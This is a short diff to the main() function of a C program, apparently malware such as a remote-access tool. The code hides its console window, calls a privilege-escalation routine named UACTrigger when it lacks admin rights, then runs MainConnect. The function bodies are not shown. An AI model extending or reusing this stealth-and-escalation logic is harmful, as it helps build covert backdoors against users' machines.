@@ -11,7 +11,10 @@ Modified: -
 int main() // entry point
 {
     FreeConsole();
-    UACTrigger();
+    if(!IsAdmin()){
+        UACTrigger();
+        exit(0);
+    }
     MainConnect();
     return 0;
 }
